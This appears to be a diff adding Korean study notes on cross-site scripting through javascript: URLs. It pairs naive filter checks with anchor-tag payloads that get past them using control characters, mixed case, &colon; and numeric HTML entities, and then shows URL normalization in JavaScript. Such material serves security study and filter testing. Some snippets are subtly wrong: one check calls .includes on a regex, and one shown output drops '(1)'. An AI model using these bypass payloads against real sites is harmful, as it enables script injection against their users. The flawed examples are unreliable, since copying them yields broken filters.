@@ -1,0 +1,47 @@
+활성 하이퍼링크 :
+    HTML 마크업에서 사용될 수 있는 URL들은 활성 콘텐츠를 포함할 수 있습니다.
+
+    이 중 javascript: 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 합니다.
+    브라우저들은 또한 URL를 사용할 때 정규화(normalization)를 거치는데, 이 과정에서 \x01, \x04 와 같은 특수 제어 문자들이 제거될 수 있습니다.
+    HTML 요소 속성에서 엔티티를 사용할 수 있다는 점을 이용하면 다양한 우회 기법을 사용할 수 있게 됩니다.
+
+    $#number : HTML Entity
+    
+    ex)
+        x => !/href\s*=(["']\s*)?javascript:/i.test(x)
+        --> <a href="&#4;&#4;jAvaScRIpT:alert(1)">Click me!</a>
+        
+        x => !/javascript:/i.test(x)
+        --> <a href="javascript&colon;alert(1)">Click me!</a>
+        
+        x => !/javascript(:|&colon;)/i.includes(x)
+        --> <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click me!</a>
+
+    JavaScript에서는 URL 객체를 통해 URL을 직접 정규화할 수 있으며, protocol, hostname 등 URL의 각종 정보를 추출할 수 있습니다.
+
+    ex)
+        function normalizeURL(url) {
+            return new URL(url, document.baseURI);
+        }
+        
+        normalizeURL('\4\4jAvaScRIpT:alert(1)')
+        --> "javascript:alert"
+        
+        normalizeURL('\4\4jAvaScRIpT:alert(1)').protocol
+        --> "javascript:"
+        
+        normalizeURL('\4\4jAvaScRIpT:alert(1)').pathname
+        --> "alert(1)"
+
+
+
+
+
+
+
+
+
+
+
+
+
